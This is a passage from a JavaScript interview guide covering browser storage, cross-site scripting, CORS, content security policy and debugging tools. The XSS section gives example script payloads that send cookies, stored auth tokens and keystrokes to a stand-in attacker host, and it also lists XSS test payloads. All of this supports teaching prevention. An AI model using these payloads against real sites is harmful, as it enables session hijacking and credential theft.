function deleteCookie(name) {
    document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
}
```

### Comparison Table

| Feature | localStorage | sessionStorage | Cookies |
|---------|--------------|----------------|---------|
| **Capacity** | ~5-10MB | ~5-10MB | ~4KB per cookie |
| **Lifespan** | No expiration | Until tab closes | Set expiration date |
| **Scope** | Same origin, all tabs | Same tab only | Can be sent to server |
| **Sent with requests** | No | No | Yes (automatically) |
| **Accessibility** | Client-side only | Client-side only | Client and server |
| **API** | Simple key-value | Simple key-value | String parsing required |
| **Security** | Vulnerable to XSS | Vulnerable to XSS | Can be HttpOnly/Secure |

### Security Considerations

```javascript
// localStorage/sessionStorage - vulnerable to XSS
// Never store sensitive data like passwords or tokens
localStorage.setItem('token', 'sensitive-token');  // ❌ Vulnerable

// Cookies - can be made more secure
document.cookie = "token=sensitive-token; secure; httponly; samesite=strict";  // ✓ Better

// HttpOnly cookies (set server-side) can't be accessed by JavaScript
// This prevents XSS attacks from stealing cookies
```

### Cookie Attributes

```javascript
// secure - Only sent over HTTPS
document.cookie = "data=value; secure";

// httponly - Cannot be accessed by JavaScript (set server-side)
// Set-Cookie: sessionId=abc123; HttpOnly

// samesite - CSRF protection
document.cookie = "data=value; samesite=strict";  // Not sent on cross-site requests
document.cookie = "data=value; samesite=lax";     // Sent on top-level navigation
document.cookie = "data=value; samesite=none; secure";  // Sent everywhere (requires secure)

// domain - Which domain can access the cookie
document.cookie = "data=value; domain=.example.com";

// path - Which path can access the cookie
document.cookie = "data=value; path=/admin";
```

### Practical Use Cases

**localStorage:**
```javascript
// User preferences
function saveTheme(theme) {
    localStorage.setItem('theme', theme);
    applyTheme(theme);
}

function loadTheme() {
    let theme = localStorage.getItem('theme') || 'light';
    applyTheme(theme);
}

// Shopping cart
function saveCart(items) {
    localStorage.setItem('cart', JSON.stringify(items));
}

function loadCart() {
    let cart = localStorage.getItem('cart');
    return cart ? JSON.parse(cart) : [];
}
```

**sessionStorage:**
```javascript
// Form data preservation during navigation
form.addEventListener('input', () => {
    sessionStorage.setItem('formData', JSON.stringify(getFormData()));
});

window.addEventListener('load', () => {
    let savedData = sessionStorage.getItem('formData');
    if (savedData) {
        restoreFormData(JSON.parse(savedData));
    }
});

// Multi-step wizard state
function saveWizardStep(step, data) {
    sessionStorage.setItem(`wizard_step${step}`, JSON.stringify(data));
}
```

**Cookies:**
```javascript
// Authentication tokens (preferably HttpOnly, set by server)
// Session identifiers
// Tracking and analytics
// A/B test assignments

// Remember me functionality
function rememberUser(username) {
    setCookie('remembered_user', username, 30);  // 30 days
}

// Language preference (needs to be sent to server)
function setLanguage(lang) {
    setCookie('language', lang, 365);
}
```

### Storage Events

Listen for changes in localStorage (from other tabs):

```javascript
window.addEventListener('storage', (event) => {
    console.log('Key:', event.key);
    console.log('Old value:', event.oldValue);
    console.log('New value:', event.newValue);
    console.log('URL:', event.url);
    console.log('Storage area:', event.storageArea);
    
    // Update UI based on changes
    if (event.key === 'theme') {
        applyTheme(event.newValue);
    }
});

// Note: storage event only fires in OTHER tabs/windows, not the current one
```

### Checking Availability

```javascript
function isStorageAvailable(type) {
    try {
        let storage = window[type];
        let test = '__storage_test__';
        storage.setItem(test, test);
        storage.removeItem(test);
        return true;
    } catch (e) {
        return false;
    }
}

if (isStorageAvailable('localStorage')) {
    console.log('localStorage is available');
} else {
    console.log('localStorage is not available (private mode, quota exceeded, etc.)');
}
```

### Best Practices

- Use **localStorage** for long-term client-side data (preferences, cached data)
- Use **sessionStorage** for temporary data within a single session
- Use **cookies** for data that needs to be sent to the server
- Never store sensitive data in localStorage/sessionStorage
- Always validate and sanitize data retrieved from storage
- Handle quota exceeded errors gracefully
- Use HttpOnly, Secure, and SameSite flags for cookies when possible

<br>

## 42. Can you explain Cross-Site Scripting (XSS) and how to prevent it?

**Cross-Site Scripting (XSS)** is a security vulnerability where attackers inject malicious scripts into web pages viewed by other users.

### Types of XSS

1. **Stored XSS (Persistent)**: Malicious script is stored on the server (database, file system) and executed when users view the affected page.

2. **Reflected XSS (Non-Persistent)**: Malicious script is reflected off a web server, typically in URL parameters or form submissions.

3. **DOM-Based XSS**: Vulnerability exists in client-side code that improperly handles user input.

### How XSS Works

```javascript
// Vulnerable code example
let userInput = '<script>alert("XSS Attack!")</script>';
document.getElementById('content').innerHTML = userInput;
// The script executes, potentially stealing cookies or session tokens

// URL-based attack
// URL: https://example.com/search?q=<script>alert('XSS')</script>
let searchQuery = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = 'You searched for: ' + searchQuery;
```

### Attack Scenarios

```javascript
// Stealing cookies
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Keylogging
<script>
    document.addEventListener('keypress', (e) => {
        fetch('https://attacker.com/log?key=' + e.key);
    });
</script>

// Session hijacking
<script>
    let token = localStorage.getItem('authToken');
    fetch('https://attacker.com/steal?token=' + token);
</script>

// Defacement
<script>
    document.body.innerHTML = '<h1>Hacked!</h1>';
</script>
```

### Prevention Techniques

**1. Input Validation and Sanitization:**

```javascript
// Whitelist allowed characters
function sanitizeInput(input) {
    return input.replace(/[^a-zA-Z0-9\s]/g, '');
}

// Validate input format
function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Reject dangerous patterns
function containsDangerousContent(input) {
    let dangerous = /<script|javascript:|onerror=/i;
    return dangerous.test(input);
}
```

**2. Output Encoding/Escaping:**

```javascript
// HTML escape function
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Safe usage
let userInput = '<script>alert("XSS")</script>';
let safe = escapeHtml(userInput);
document.getElementById('content').textContent = safe;
// Displays as text: &lt;script&gt;alert("XSS")&lt;/script&gt;

// Or use textContent instead of innerHTML
document.getElementById('content').textContent = userInput;  // Safe
document.getElementById('content').innerHTML = userInput;    // Dangerous
```

**3. Use Safe APIs:**

```javascript
// Dangerous - innerHTML
element.innerHTML = userInput;  // ❌

// Safe alternatives
element.textContent = userInput;  // ✓ Renders as text
element.innerText = userInput;    // ✓ Renders as text

// Create elements programmatically
let div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div);  // ✓ Safe

// Use insertAdjacentText instead of insertAdjacentHTML
element.insertAdjacentText('beforeend', userInput);  // ✓ Safe
```

**4. Content Security Policy (CSP):**

```html
<!-- In HTML meta tag -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none';">

<!-- Or via HTTP header (server-side) -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' -->
```

```javascript
// CSP prevents inline scripts from executing
<script>alert('XSS')</script>  // Blocked by CSP

// Only scripts from same origin or whitelisted sources execute
<script src="https://trusted-cdn.com/script.js"></script>  // Allowed if whitelisted
```

**5. HTTPOnly and Secure Cookies:**

```javascript
// Set server-side (cannot be set via document.cookie)
// Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

// HttpOnly prevents JavaScript access
console.log(document.cookie);  // Won't include HttpOnly cookies

// Secure ensures cookie only sent over HTTPS
// SameSite prevents CSRF attacks
```

**6. DOMPurify Library:**

```javascript
// Using DOMPurify for safe HTML rendering
let dirty = '<img src=x onerror=alert("XSS")>';
let clean = DOMPurify.sanitize(dirty);
document.getElementById('content').innerHTML = clean;  // Safe

// With options
let clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: ['class']
});
```

**7. Framework-Specific Protections:**

```javascript
// React automatically escapes
const userInput = '<script>alert("XSS")</script>';
return <div>{userInput}</div>;  // Safe - rendered as text

// dangerouslySetInnerHTML (use with caution)
return <div dangerouslySetInnerHTML={{__html: sanitizedInput}} />;

// Vue.js
<div>{{ userInput }}</div>  <!-- Safe - auto-escaped -->
<div v-html="userInput"></div>  <!-- Dangerous - renders HTML -->

// Angular
<div>{{ userInput }}</div>  <!-- Safe - auto-sanitized -->
<div [innerHTML]="userInput"></div>  <!-- Sanitized by Angular -->
```

**8. URL Validation:**

```javascript
// Validate URLs before using them
function isSafeUrl(url) {
    try {
        let parsed = new URL(url);
        return ['http:', 'https:'].includes(parsed.protocol);
    } catch {
        return false;
    }
}

// Dangerous
link.href = userInput;  // ❌ Could be javascript:alert('XSS')

// Safe
if (isSafeUrl(userInput)) {
    link.href = userInput;  // ✓
}
```

**9. Avoid eval() and Similar Functions:**

```javascript
// Dangerous
eval(userInput);  // ❌ Never use with user input
new Function(userInput)();  // ❌
setTimeout(userInput, 1000);  // ❌
setInterval(userInput, 1000);  // ❌

// Safe alternatives
JSON.parse(userInput);  // ✓ For JSON data
// Use proper parsing and validation
```

**10. Template Literals Safety:**

```javascript
// Dangerous with user input
let html = `<div>${userInput}</div>`;
element.innerHTML = html;  // ❌

// Safe
let html = `<div>${escapeHtml(userInput)}</div>`;
element.innerHTML = html;  // ✓

// Or use textContent
element.textContent = userInput;  // ✓ Safest
```

### Real-World Prevention Example

```javascript
// Comment system with XSS protection
class CommentSystem {
    constructor() {
        this.comments = [];
    }
    
    sanitizeComment(text) {
        // Remove HTML tags
        return text.replace(/<[^>]*>/g, '');
    }
    
    escapeHtml(text) {
        let div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    addComment(username, text) {
        // Validate and sanitize
        if (typeof username !== 'string' || typeof text !== 'string') {
            throw new Error('Invalid input');
        }
        
        let sanitized = {
            username: this.sanitizeComment(username),
            text: this.sanitizeComment(text),
            timestamp: Date.now()
        };
        
        this.comments.push(sanitized);
        this.renderComments();
    }
    
    renderComments() {
        let container = document.getElementById('comments');
        container.innerHTML = '';  // Clear
        
        this.comments.forEach(comment => {
            let div = document.createElement('div');
            div.className = 'comment';
            
            let user = document.createElement('strong');
            user.textContent = comment.username;  // Safe
            
            let text = document.createElement('p');
            text.textContent = comment.text;  // Safe
            
            div.appendChild(user);
            div.appendChild(text);
            container.appendChild(div);
        });
    }
}
```

### Testing for XSS

```javascript
// Common XSS payloads for testing
let testPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\';alert("XSS");//'
];

// Test your sanitization
testPayloads.forEach(payload => {
    let sanitized = sanitizeFunction(payload);
    console.log('Original:', payload);
    console.log('Sanitized:', sanitized);
    console.log('---');
});
```

### Best Practices Summary

1. **Never trust user input** - Always validate and sanitize
2. **Use textContent over innerHTML** when displaying user content
3. **Implement Content Security Policy**
4. **Use HTTPOnly and Secure flags** for cookies
5. **Encode output** based on context (HTML, JavaScript, URL, CSS)
6. **Use established libraries** like DOMPurify for sanitization
7. **Keep frameworks updated** - they include XSS protections
8. **Perform security audits** and penetration testing
9. **Educate developers** about XSS risks
10. **Use automated tools** to scan for vulnerabilities

<br>

## 43. What is Cross-Origin Resource Sharing (CORS) and how does it work?

**CORS (Cross-Origin Resource Sharing)** is a security mechanism that allows or restricts web pages from making requests to a different domain than the one serving the web page.

### Same-Origin Policy

Browsers enforce the **same-origin policy** by default, which prevents JavaScript from making requests to a different origin (domain, protocol, or port).

```javascript
// Same origin examples
https://example.com/page1  →  https://example.com/page2  ✓ Same origin
https://example.com:443/page1  →  https://example.com/page2  ✓ Same origin (443 is default HTTPS)

// Different origin examples
https://example.com  →  http://example.com  ✗ Different protocol
https://example.com  →  https://api.example.com  ✗ Different subdomain
https://example.com  →  https://example.com:8080  ✗ Different port
https://example.com  →  https://other.com  ✗ Different domain
```

### How CORS Works

CORS uses HTTP headers to tell browsers to allow a web application from one origin to access resources from a different origin.

**Simple Request Flow:**

```javascript
// Client-side request
fetch('https://api.example.com/data')
    .then(response => response.json())
    .then(data => console.log(data));

// Browser adds Origin header:
// Origin: https://mysite.com

// Server responds with CORS headers:
// Access-Control-Allow-Origin: https://mysite.com
// (or Access-Control-Allow-Origin: *)

// If headers match, browser allows the response
```

**Preflight Request Flow (for complex requests):**

```javascript
// Client makes request with custom headers or non-simple methods
fetch('https://api.example.com/data', {
    method: 'PUT',
    headers: {
        'Content-Type': 'application/json',
        'X-Custom-Header': 'value'
    },
    body: JSON.stringify({data: 'value'})
});

// Browser first sends OPTIONS preflight request:
// OPTIONS /data HTTP/1.1
// Origin: https://mysite.com
// Access-Control-Request-Method: PUT
// Access-Control-Request-Headers: Content-Type, X-Custom-Header

// Server responds to preflight:
// Access-Control-Allow-Origin: https://mysite.com
// Access-Control-Allow-Methods: GET, POST, PUT
// Access-Control-Allow-Headers: Content-Type, X-Custom-Header
// Access-Control-Max-Age: 86400

// If allowed, browser sends actual request
```

### CORS Headers

**Response Headers (Server-side):**

```javascript
// Allow specific origin
Access-Control-Allow-Origin: https://mysite.com

// Allow any origin (less secure)
Access-Control-Allow-Origin: *

// Allow credentials (cookies, authorization headers)
Access-Control-Allow-Credentials: true

// Allowed HTTP methods
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

// Allowed headers
Access-Control-Allow-Headers: Content-Type, Authorization

// Expose additional headers to JavaScript
Access-Control-Expose-Headers: X-Total-Count

// Cache preflight response (seconds)
Access-Control-Max-Age: 3600
```

**Request Headers (Browser-added):**

```javascript
// Origin of the request
Origin: https://mysite.com

// Requested method (preflight)
Access-Control-Request-Method: PUT

// Requested headers (preflight)
Access-Control-Request-Headers: Content-Type
```

### Simple vs Preflight Requests

**Simple Requests** (no preflight needed):
- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language, Content-Type (limited)
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Preflight Requests** (OPTIONS sent first):
- Methods: PUT, DELETE, PATCH, etc.
- Custom headers
- Content-Type: application/json, application/xml, etc.

### Client-Side CORS Handling

```javascript
// Fetch API
fetch('https://api.example.com/data', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    credentials: 'include',  // Send cookies
    body: JSON.stringify({data: 'value'})
})
.then(response => {
    if (!response.ok) {
        throw new Error('CORS request failed');
    }
    return response.json();
})
.catch(error => {
    console.error('CORS error:', error);
});

// XMLHttpRequest
let xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.example.com/data');
xhr.withCredentials = true;  // Send cookies
xhr.onload = function() {
    if (xhr.status === 200) {
        console.log(xhr.responseText);
    }
};
xhr.onerror = function() {
    console.error('CORS error');
};
xhr.send();
```

### Server-Side CORS Setup

**Node.js/Express:**

```javascript
// Using cors middleware
const cors = require('cors');

// Allow all origins
app.use(cors());

// Custom configuration
app.use(cors({
    origin: 'https://mysite.com',  // or array of origins
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true,
    maxAge: 3600
}));

// Dynamic origin
app.use(cors({
    origin: function(origin, callback) {
        const allowedOrigins = ['https://site1.com', 'https://site2.com'];
        if (!origin || allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    }
}));

// Manual headers
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', 'https://mysite.com');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.header('Access-Control-Allow-Credentials', 'true');
    
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});
```

**PHP:**

```php
<?php
header('Access-Control-Allow-Origin: https://mysite.com');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Credentials: true');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}
?>
```

### Common CORS Errors

```javascript
// Error messages
"Access to fetch at 'https://api.example.com' from origin 'https://mysite.com' has been blocked by CORS policy"

"No 'Access-Control-Allow-Origin' header is present on the requested resource"

"The 'Access-Control-Allow-Origin' header contains multiple values '*, https://mysite.com', but only one is allowed"

"Credential is not supported if the CORS header 'Access-Control-Allow-Origin' is '*'"
```

### Debugging CORS

```javascript
// Check if CORS error
fetch('https://api.example.com/data')
    .then(response => response.json())
    .catch(error => {
        if (error instanceof TypeError) {
            console.log('Possible CORS error or network issue');
        }
    });

// Browser developer tools
// Network tab shows:
// - Request headers (Origin)
// - Response headers (Access-Control-*)
// - Preflight OPTIONS requests

// Test with curl
// curl -H "Origin: https://mysite.com" -I https://api.example.com/data
```

### Workarounds (Not Recommended for Production)

```javascript
// 1. Proxy server (development)
// Create local proxy that adds CORS headers

// 2. JSONP (legacy, GET only)
function jsonp(url, callback) {
    let script = document.createElement('script');
    window[callback] = function(data) {
        delete window[callback];
        document.body.removeChild(script);
        // Handle data
    };
    script.src = `${url}?callback=${callback}`;
    document.body.appendChild(script);
}

// 3. Browser extensions (development only)
// Extensions like "CORS Unblock" disable CORS in browser

// 4. Server-side proxy (production solution)
// Make requests from your server instead of client
```

### Security Considerations

```javascript
// Don't use wildcard with credentials
// ❌ Dangerous
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

// ✓ Secure - specify exact origin
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Credentials: true

// Validate origin on server
const allowedOrigins = ['https://site1.com', 'https://site2.com'];
const origin = req.headers.origin;
if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
}

// Use HTTPS for sensitive data
// Implement proper authentication
// Limit allowed methods and headers
```

### Best Practices

1. **Be specific with origins** - avoid `*` in production
2. **Use credentials carefully** - only when necessary
3. **Limit allowed methods** - only what you need
4. **Validate origins server-side** - whitelist approach
5. **Cache preflight requests** - use `Access-Control-Max-Age`
6. **Handle errors gracefully** - provide user feedback
7. **Test thoroughly** - different browsers, scenarios
8. **Document API CORS policy** - for API consumers

<br>

## 44. How does content security policy (CSP) help in preventing security attacks?

**Content Security Policy (CSP)** is a security layer that helps detect and mitigate certain types of attacks, including XSS and data injection attacks, by controlling which resources can be loaded and executed.

### How CSP Works

CSP uses HTTP headers or meta tags to define trusted sources of content. Browsers then only execute or render resources from those sources.

```html
<!-- Meta tag (limited functionality) -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com;">

<!-- HTTP Header (recommended, more powerful) -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com -->
```

### CSP Directives

```javascript
// default-src: Fallback for other directives
default-src 'self';

// script-src: JavaScript sources
script-src 'self' https://trusted-cdn.com;

// style-src: CSS sources
style-src 'self' 'unsafe-inline';

// img-src: Image sources
img-src 'self' data: https:;

// font-src: Font sources
font-src 'self' https://fonts.gstatic.com;

// connect-src: AJAX, WebSocket, fetch() sources
connect-src 'self' https://api.example.com;

// media-src: Audio and video sources
media-src 'self' https://media.example.com;

// object-src: <object>, <embed>, <applet>
object-src 'none';

// frame-src: <iframe> sources
frame-src 'self' https://trusted-embed.com;

// child-src: Web workers and nested contexts
child-src 'self';

// form-action: Form submission targets
form-action 'self';

// frame-ancestors: Sources that can embed this page
frame-ancestors 'none';  // Prevents clickjacking

// base-uri: Restricts <base> tag URLs
base-uri 'self';

// upgrade-insecure-requests: Upgrade HTTP to HTTPS
upgrade-insecure-requests;
```

### Source Values

```javascript
// 'none' - Block everything
script-src 'none';

// 'self' - Same origin only
script-src 'self';

// Specific domain
script-src https://trusted-cdn.com;

// Wildcards
script-src https://*.example.com;

// 'unsafe-inline' - Allow inline scripts (not recommended)
script-src 'self' 'unsafe-inline';

// 'unsafe-eval' - Allow eval() (not recommended)
script-



src 'self' 'unsafe-eval';

// 'nonce-<value>' - Allow specific inline scripts with nonce
script-src 'nonce-2726c7f26c';

// 'sha256-<hash>' - Allow specific inline scripts by hash
script-src 'sha256-abc123...';

// data: - Allow data: URIs
img-src 'self' data:;

// https: - Allow any HTTPS source
img-src https:;
```

### Practical Examples

**Basic CSP Configuration:**

```javascript
// Strict policy (recommended starting point)
Content-Security-Policy: 
    default-src 'none';
    script-src 'self';
    style-src 'self';
    img-src 'self';
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';

// More permissive (with CDNs)
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
    style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' https: data:;
    connect-src 'self' https://api.example.com;
```

**Using Nonces for Inline Scripts:**

```html
<!-- Server generates unique nonce for each request -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'nonce-r4nd0m123';">

<!-- Inline script with matching nonce is allowed -->
<script nonce="r4nd0m123">
    console.log('This script is allowed');
</script>

<!-- Script without nonce is blocked -->
<script>
    console.log('This script is blocked');
</script>
```

```javascript
// Server-side (Node.js/Express example)
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate unique nonce for each request
    res.locals.nonce = crypto.randomBytes(16).toString('base64');
    
    res.setHeader(
        'Content-Security-Policy',
        `script-src 'self' 'nonce-${res.locals.nonce}'`
    );
    
    next();
});

// In template
// <script nonce="<%= nonce %>">
```

**Using Hashes for Inline Scripts:**

```html
<!-- Calculate SHA256 hash of script content -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self' 'sha256-{hash-of-script-content}';">

<script>
    console.log('Allowed by hash');
</script>
```

```javascript
// Calculate hash (example)
const crypto = require('crypto');
const scriptContent = "console.log('Allowed by hash');";
const hash = crypto.createHash('sha256').update(scriptContent).digest('base64');
console.log(`sha256-${hash}`);
// Use this in CSP header
```

### CSP Report-Only Mode

Test CSP without breaking functionality:

```javascript
// Report violations but don't block
Content-Security-Policy-Report-Only: 
    default-src 'self';
    report-uri /csp-violation-report;

// Server endpoint to receive reports
app.post('/csp-violation-report', (req, res) => {
    console.log('CSP Violation:', req.body);
    // Log to monitoring service
    res.status(204).send();
});
```

**Violation Report Structure:**

```javascript
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src 'self'",
    "blocked-uri": "https://evil.com/malicious.js",
    "source-file": "https://example.com/page",
    "line-number": 23,
    "column-number": 5,
    "status-code": 200
  }
}
```

### Preventing Common Attacks

**1. XSS Prevention:**

```javascript
// Without CSP - vulnerable
<script>
    // Attacker injects:
    document.body.innerHTML = userInput;
</script>

// With CSP
Content-Security-Policy: script-src 'self';
// Inline scripts and external malicious scripts are blocked
```

**2. Clickjacking Prevention:**

```javascript
// Prevent page from being embedded
Content-Security-Policy: frame-ancestors 'none';

// Allow embedding only from trusted domains
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

**3. Data Injection Prevention:**

```javascript
// Restrict where data can be loaded from
Content-Security-Policy:
    default-src 'self';
    connect-src 'self' https://api.example.com;
    
// Blocks unauthorized API calls
fetch('https://evil.com/steal-data');  // Blocked by CSP
```

**4. Mixed Content Prevention:**

```javascript
// Upgrade insecure requests to HTTPS
Content-Security-Policy: upgrade-insecure-requests;

// All HTTP requests automatically upgraded to HTTPS
<img src="http://example.com/image.jpg">
// Actually loads: https://example.com/image.jpg
```

### Real-World Implementation

**Express.js with Helmet:**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
            "'self'",
            "https://cdn.jsdelivr.net",
            "https://cdnjs.cloudflare.com"
        ],
        styleSrc: [
            "'self'",
            "https://fonts.googleapis.com",
            "'unsafe-inline'"  // For inline styles if needed
        ],
        fontSrc: [
            "'self'",
            "https://fonts.gstatic.com"
        ],
        imgSrc: [
            "'self'",
            "https:",
            "data:"
        ],
        connectSrc: [
            "'self'",
            "https://api.example.com"
        ],
        frameSrc: ["'none'"],
        objectSrc: ["'none'"],
        upgradeInsecureRequests: [],
        reportUri: ["/csp-violation-report"]
    },
    reportOnly: false  // Set to true for testing
}));
```

**Nginx Configuration:**

```nginx
# Add CSP header in nginx config
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline';" always;

# For report-only mode
add_header Content-Security-Policy-Report-Only "default-src 'self'; report-uri /csp-violation-report;" always;
```

**Apache Configuration:**

```apache
# Add CSP header in .htaccess or apache config
<IfModule mod_headers.c>
    Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com;"
</IfModule>
```

### Monitoring and Testing

```javascript
// Browser console shows CSP violations
// Example error:
// "Refused to load the script 'https://evil.com/bad.js' because it violates the following Content Security Policy directive: "script-src 'self'"

// Testing tools
// 1. Browser DevTools - Console shows violations
// 2. CSP Evaluator - https://csp-evaluator.withgoogle.com/
// 3. Report-Only mode - monitor without breaking

// Automated testing
describe('CSP Headers', () => {
    it('should include CSP header', async () => {
        const response = await fetch('https://example.com');
        const csp = response.headers.get('content-security-policy');
        expect(csp).toContain("default-src 'self'");
    });
});
```

### Common CSP Mistakes

```javascript
// 1. Too permissive - defeats the purpose
Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval';  // ❌

// 2. Allowing 'unsafe-inline' without nonces
Content-Security-Policy: script-src 'self' 'unsafe-inline';  // ❌

// 3. Using wildcards too broadly
Content-Security-Policy: script-src https://*;  // ❌ Allows any HTTPS source

// 4. Not testing before deployment
// Always use report-only mode first ❌

// 5. Forgetting to update after adding new resources
// Results in broken functionality ❌
```

### Migration Strategy

```javascript
// Step 1: Start with report-only
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report;

// Step 2: Monitor reports and adjust policy
// Review violation reports regularly

// Step 3: Gradually tighten policy
Content-Security-Policy-Report-Only: 
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    report-uri /csp-report;

// Step 4: Enable enforcement
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    report-uri /csp-report;

// Step 5: Continue monitoring and refining
```

### Benefits of CSP

1. **Mitigates XSS attacks** - Blocks unauthorized script execution
2. **Prevents data exfiltration** - Controls where data can be sent
3. **Stops clickjacking** - Controls frame embedding
4. **Enforces HTTPS** - Upgrades insecure requests
5. **Provides visibility** - Reports violations for monitoring
6. **Defense in depth** - Additional security layer
7. **Standardized** - Supported by all modern browsers

### Best Practices

1. **Start with report-only mode** - Test before enforcing
2. **Use nonces or hashes** - Avoid 'unsafe-inline'
3. **Be specific with sources** - Avoid wildcards
4. **Monitor violations** - Set up reporting
5. **Keep policy updated** - As you add new resources
6. **Document your policy** - For team reference
7. **Test thoroughly** - All pages and features
8. **Combine with other security measures** - CSP isn't a silver bullet
9. **Use strict-dynamic** - For better nonce-based policies (modern browsers)
10. **Regular audits** - Review and tighten policy over time

<br>

# JavaScript Debugging (45-48)

## 45. What tools and techniques do you use for debugging JavaScript code?

JavaScript debugging involves identifying and fixing errors using various tools and techniques.

### Browser Developer Tools

**1. Console Methods:**

```javascript
// Basic logging
console.log('Simple message');
console.log('Multiple', 'values', {obj: 'data'});

// Different log levels
console.info('Informational message');
console.warn('Warning message');
console.error('Error message');

// Grouped logs
console.group('User Details');
console.log('Name: John');
console.log('Age: 30');
console.groupEnd();

// Collapsible groups
console.groupCollapsed('Collapsed Group');
console.log('Hidden by default');
console.groupEnd();

// Table format (for arrays/objects)
console.table([
    {name: 'John', age: 30},
    {name: 'Jane', age: 25}
]);

// Timing
console.time('Operation');
// ... code to measure
console.timeEnd('Operation');  // Logs: Operation: 123.45ms

// Counting
console.count('Button clicked');  // Button clicked: 1
console.count('Button clicked');  // Button clicked: 2
console.countReset('Button clicked');

// Assertions
console.assert(x > 0, 'x must be positive', {x});

// Stack trace
console.trace('Execution path');

// Clear console
console.clear();
```

**2. Debugger Statement:**

```javascript
function calculateTotal(items) {
    let total = 0;
    
    debugger;  // Execution pauses here when DevTools open
    
    for (let item of items) {
        total += item.price;
    }
    
    return total;
}
```

**3. Conditional Logging:**

```javascript
// Log only in development
const DEBUG = true;

function debug(...args) {
    if (DEBUG) {
        console.log('[DEBUG]', ...args);
    }
}

debug('User logged in', {userId: 123});

// Environment-specific logging
if (process.env.NODE_ENV !== 'production') {
    console.log('Development mode');
}
```

### Chrome DevTools Features

```javascript
// 1. Network Tab
// - Monitor API requests
// - Check response times
// - View request/response headers and bodies

// 2. Sources Tab
// - Set breakpoints by clicking line numbers
// - Conditional breakpoints (right-click line number)
// - Watch expressions
// - Call stack inspection

// 3. Performance Tab
// - Record and analyze performance
// - Identify bottlenecks
// - Memory profiling

// 4. Application Tab
// - Inspect localStorage/sessionStorage
// - View cookies
// - Check Service Workers
// - Examine IndexedDB

// 5. Console Tab
// - Execute code in current context
// - Access DOM elements
// - Test functions
```

### Advanced Console Techniques

```javascript
// Style console output
console.log('%cStyled Text', 'color: blue; font-size: 20px; font-weight: bold;');

// Multiple styles
console.log(
    '%cError: %cSomething went wrong',
    'color: red; font-weight: bold;',
    'color: black;'
);

// Copy to clipboard (Chrome)
copy(complexObject);  // Copies object to clipboard

// Monitor function calls
monitor(myFunction);  // Logs when myFunction is called
unmonitor(myFunction);

// Get event listeners
getEventListeners(document.getElementById('button'));

// Inspect DOM element
inspect(document.getElementById('element'));

// Dollar sign shortcuts
$('#id')  // Equivalent to document.getElementById('id')
$$('.class')  // Equivalent to document.querySelectorAll('.class')
$_  // Last evaluated expression
$0  // Last selected element in Elements panel
```

### Error Handling and Tracking

```javascript
// Try-catch blocks
try {
    riskyOperation();
} catch (error) {
    console.error('Error occurred:', error);
    console.error('Stack:', error.stack);
    console.error('Message:', error.message);
    console.error('Name:', error.name);
    
